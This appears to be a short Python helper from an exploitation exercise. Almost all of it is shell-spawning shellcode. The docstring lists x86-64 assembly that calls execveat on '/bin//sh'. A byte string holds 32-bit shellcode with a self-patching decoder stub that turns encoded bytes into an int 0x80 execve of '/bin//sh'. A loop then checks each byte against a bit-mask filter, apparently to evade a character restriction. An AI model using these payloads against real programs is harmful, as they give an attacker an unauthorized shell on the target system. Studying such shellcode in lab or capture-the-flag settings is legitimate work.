#!/usr/bin/env python3

"""
--[ asm
6a 42                   push   0x42
58                      pop    rax
fe c4                   inc    ah
48 99                   cqo
52                      push   rdx
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
2f 73 68
57                      push   rdi
54                      push   rsp
5e                      pop    rsi
49 89 d0                mov    r8, rdx
49 89 d2                mov    r10, rdx
0f 05                   syscall
"""

codes = b"\xeb\x1c\x5a\x89\xd6\x8b\x02\x66\x3d\xca\x7d\x75\x06\x66\x05\x03\x03\x89\x02\xfe\xc2\x3d\x41\x41\x41\x41\x75\xe9\xff\xe6\xe8\xdf\xff\xff\xff\x31\xd2\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xca\x7d\x41\x41\x41\x41"


for code in codes:
    if not code & 8:
        print("bad code", hex(code))
